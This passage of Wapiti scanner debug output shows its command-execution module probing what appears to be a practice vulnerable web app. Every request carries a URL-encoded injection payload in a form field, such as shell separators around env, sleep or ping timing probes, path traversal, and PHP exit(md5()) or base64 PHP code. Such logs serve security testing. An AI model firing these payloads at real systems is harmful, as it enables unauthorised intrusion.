2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:39.822 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=%26ping%20-n%2025%20127.0.0.1%26&lastname=default&form=submit (1)
2024-03-20 16:49:39.837 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%3Benv%3B&form=submit (1)
2024-03-20 16:49:39.845 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%7Cenv%7C&form=submit (1)
2024-03-20 16:49:39.853 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%3Benv%3B&form=submit (1)
2024-03-20 16:49:39.861 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%3Benv%3B&form=submit (1)
2024-03-20 16:49:39.868 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&form=submit (1)
2024-03-20 16:49:39.876 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%3Benv%3B&form=submit (1)
2024-03-20 16:49:39.884 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default%0Aenv%3B&form=submit (1)
2024-03-20 16:49:39.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%26set%26&form=submit (1)
2024-03-20 16:49:39.901 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=set&form=submit (1)
2024-03-20 16:49:39.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=env&form=submit (1)
2024-03-20 16:49:39.917 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%2Fe%00&form=submit (1)
2024-03-20 16:49:39.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:39.933 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:39.942 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:39.950 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:39.959 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:39.967 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:39.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:39.983 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:39.991 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:39.999 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:40.008 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&form=submit (1)
2024-03-20 16:49:40.016 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&form=submit (1)
2024-03-20 16:49:40.025 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&form=submit (1)
2024-03-20 16:49:40.034 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%60%29%60&form=submit (1)
2024-03-20 16:49:40.043 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%60sleep%2060%60&form=submit (1)
2024-03-20 16:49:40.050 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%3Bsleep%2060%3B&form=submit (1)
2024-03-20 16:49:40.059 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=a%7Csleep%2060%3B&form=submit (1)
2024-03-20 16:49:40.066 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=%26ping%20-n%2025%20127.0.0.1%26&form=submit (1)
2024-03-20 16:49:40.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%3Benv%3B (1)
2024-03-20 16:49:40.084 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%7Cenv%7C (1)
2024-03-20 16:49:40.093 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%3Benv%3B (1)
2024-03-20 16:49:40.101 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%3Benv%3B (1)
2024-03-20 16:49:40.109 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
2024-03-20 16:49:40.118 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%3Benv%3B (1)
2024-03-20 16:49:40.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%0Aenv%3B (1)
2024-03-20 16:49:40.134 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%26set%26 (1)
2024-03-20 16:49:40.142 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=set (1)
2024-03-20 16:49:40.149 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=env (1)
2024-03-20 16:49:40.157 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%2Fe%00 (1)
2024-03-20 16:49:40.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.179 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.186 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.194 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.201 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.217 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.225 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.233 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.242 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:49:40.250 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:49:40.258 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
2024-03-20 16:49:40.267 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%60%29%60 (1)
2024-03-20 16:49:40.276 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%60sleep%2060%60 (1)
2024-03-20 16:49:40.284 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%3Bsleep%2060%3B (1)
2024-03-20 16:49:40.293 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=a%7Csleep%2060%3B (1)
2024-03-20 16:49:40.302 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%26ping%20-n%2025%20127.0.0.1%26 (1)
2024-03-20 16:49:40.318 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php (1)
2024-03-20 16:49:40.329 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48
2024-03-20 16:49:40.331 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%3Benv%3B&bug=48
2024-03-20 16:49:40.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%7Cenv%7C&bug=48
2024-03-20 16:49:40.344 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%3Benv%3B&bug=48
2024-03-20 16:49:40.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%3Benv%3B&bug=48
2024-03-20 16:49:40.356 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=48
2024-03-20 16:49:40.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%3Benv%3B&bug=48
2024-03-20 16:49:40.369 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%0Aenv%3B&bug=48
2024-03-20 16:49:40.376 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%26set%26&bug=48
2024-03-20 16:49:40.382 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=set&bug=48
2024-03-20 16:49:40.387 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=env&bug=48
2024-03-20 16:49:40.393 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%2Fe%00&bug=48
2024-03-20 16:49:40.399 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.405 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.425 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.438 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.452 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.458 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.465 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=48
2024-03-20 16:49:40.476 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=48
2024-03-20 16:49:40.485 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=48
2024-03-20 16:49:40.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%60%29%60&bug=48
2024-03-20 16:49:40.506 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%60sleep%2060%60&bug=48
2024-03-20 16:49:40.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%3Bsleep%2060%3B&bug=48
2024-03-20 16:49:40.528 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=a%7Csleep%2060%3B&bug=48
2024-03-20 16:49:40.535 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=48
2024-03-20 16:49:40.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%3Benv%3B
2024-03-20 16:49:40.554 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%7Cenv%7C
2024-03-20 16:49:40.566 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:49:40.574 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%3Benv%3B
2024-03-20 16:49:40.585 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
2024-03-20 16:49:40.596 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%3Benv%3B
2024-03-20 16:49:40.604 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48%0Aenv%3B
2024-03-20 16:49:40.616 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%26set%26
2024-03-20 16:49:40.627 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=set
2024-03-20 16:49:40.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=env
2024-03-20 16:49:40.649 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%2Fe%00
2024-03-20 16:49:40.660 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.670 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.681 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.692 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.704 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.715 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.727 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.737 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.746 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.757 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.764 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
2024-03-20 16:49:40.770 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
2024-03-20 16:49:40.777 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
2024-03-20 16:49:40.784 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%60%29%60
2024-03-20 16:49:40.790 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%60sleep%2060%60
2024-03-20 16:49:40.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%3Bsleep%2060%3B
2024-03-20 16:49:40.804 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=a%7Csleep%2060%3B
2024-03-20 16:49:40.811 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=&bug=%26ping%20-n%2025%20127.0.0.1%26
2024-03-20 16:49:40.826 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:49:40.828 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%3Benv%3B&security_level=2
2024-03-20 16:49:40.834 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=%7Cenv%7C&security_level=2
2024-03-20 16:49:40.843 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:49:40.850 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:49:40.858 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/xss_get.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
